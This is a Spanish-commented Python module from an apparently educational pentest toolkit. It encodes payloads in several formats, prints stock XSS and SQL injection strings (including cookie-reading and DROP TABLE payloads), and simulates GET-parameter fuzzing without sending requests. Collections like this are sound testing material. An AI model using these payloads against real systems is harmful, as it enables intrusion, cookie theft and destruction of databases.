"""Módulo de fuzzing y codificación de payloads."""
import base64
import urllib.parse
from colorama import Fore, Style
from src.utils import limpiar_pantalla, esperar_input


def codificar_payload(texto, metodo):
    """Codifica un payload en diferentes formatos."""
    metodos = {
        "1": ("Base64", lambda t: base64.b64encode(t.encode()).decode()),
        "2": ("URL Encoding", lambda t: urllib.parse.quote(t)),
        "3": ("Hex", lambda t: t.encode().hex()),
        "4": ("Double URL", lambda t: urllib.parse.quote(urllib.parse.quote(t))),
        "5": ("HTML Entities", lambda t: "".join(f"&#{ord(c)};" for c in t)),
        "6": ("Unicode Escape", lambda t: t.encode("unicode_escape").decode()),
    }
    if metodo not in metodos:
        return None, None
    nombre, func = metodos[metodo]
    return nombre, func(texto)


def generar_payloads_xss():
    """Genera payloads XSS comunes para testing."""
    return [
        '<script>alert("XSS")</script>',
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(document.cookie)",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
        '<body onload=alert("XSS")>',
    ]


def generar_payloads_sqli():
    """Genera payloads SQLi comunes para testing."""
    return [
        "' OR '1'='1",
        '" OR "1"="1',
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "admin'--",
        "' OR 1=1#",
        "1; DROP TABLE users--",
    ]


def fuzzing_get_params(url_base):
    """Fuzzing básico de parámetros GET (educativo)."""
    print(
        f"\n{Fore.CYAN}[*] Fuzzing de parámetros en: {url_base}{Style.RESET_ALL}")
    payloads = generar_payloads_xss()[:3]
    params_comunes = ["q", "search", "id", "name", "page", "file", "url"]

    print(
        f"\n{Fore.YELLOW}Probando payloads en parámetros comunes...{Style.RESET_ALL}")
    for param in params_comunes:
        for payload in payloads:
            url_test = f"{url_base}?{param}={urllib.parse.quote(payload)}"
            print(f"  [{param}] {url_test[:80]}...")
    print(
        f"\n{Fore.GREEN}[✓] Fuzzing completado (modo educativo - sin peticiones reales){Style.RESET_ALL}")


def ejecutar():
    while True:
        limpiar_pantalla()
        print(f"\n{Fore.MAGENTA}=== 💉 FUZZING & PAYLOADS ==={Style.RESET_ALL}")
        print("  [1] Codificar payload")
        print("  [2] Generar payloads XSS")
        print("  [3] Generar payloads SQLi")
        print("  [4] Fuzzing de parámetros GET (educativo)")
        print("  [5] Volver")
        op = input("\n[>] Opción: ").strip()

        if op == "1":
            texto = input("Payload a codificar: ")
            print("\nMétodos disponibles:")
            print(
                "  [1] Base64  [2] URL  [3] Hex  [4] Double URL  [5] HTML  [6] Unicode")
            metodo = input("Elige método: ").strip()
            nombre, resultado = codificar_payload(texto, metodo)
            if nombre:
                print(
                    f"\n{Fore.GREEN}[+] {nombre}:{Style.RESET_ALL}\n    {resultado}")
            else:
                print(f"{Fore.RED}[✗] Método inválido{Style.RESET_ALL}")
            esperar_input()

        elif op == "2":
            print(f"\n{Fore.GREEN}=== Payloads XSS ==={Style.RESET_ALL}")
            for i, p in enumerate(generar_payloads_xss(), 1):
                print(f"  [{i}] {p}")
            esperar_input()

        elif op == "3":
            print(f"\n{Fore.GREEN}=== Payloads SQLi ==={Style.RESET_ALL}")
            for i, p in enumerate(generar_payloads_sqli(), 1):
                print(f"  [{i}] {p}")
            esperar_input()

        elif op == "4":
            url = input("URL base (ej: http://test.local/page.php): ").strip()
            fuzzing_get_params(url)
            esperar_input()

        elif op == "5":
            break
